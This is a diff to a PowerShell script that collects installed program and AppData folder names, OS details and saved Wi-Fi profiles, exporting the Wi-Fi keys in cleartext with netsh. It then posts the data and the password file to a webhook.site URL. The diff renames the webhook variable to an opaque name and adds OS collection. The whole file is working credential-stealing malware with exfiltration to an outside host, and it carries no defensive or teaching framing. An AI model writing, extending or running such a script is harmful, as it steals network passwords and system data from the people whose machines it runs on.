@@ -1,13 +1,15 @@
 $a = Get-ChildItem -Path "C:\Program Files\" | Where-Object { $_.PSIsContainer } | Select-Object Name
 $b = [System.IO.Path]::Combine($env:APPDATA)
 $c = Get-ChildItem -Path $b -Directory | Select-Object Name
+$f = Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, OSArchitecture
 netsh wlan export profile key=clear
-$webhookUrl = "https://webhook.site/5f09e085-afde-4b70-b363-fa665e0bf4f4"
+$e = "https://webhook.site/5f09e085-afde-4b70-b363-fa665e0bf4f4"
 powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS
 $data = @{
+    "OSInfo" = $f
     "Main" = $a.Name
     "User" = $c.Name
 }
 $jsonData = $data | ConvertTo-Json
-Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $jsonData -ContentType "application/json"
-powershell Invoke-WebRequest -Uri $webhookUrl -Method POST -InFile Wi-Fi-PASS
+Invoke-RestMethod -Uri $e -Method Post -Body $jsonData -ContentType "application/json"
+powershell Invoke-WebRequest -Uri $e -Method POST -InFile Wi-Fi-PASS
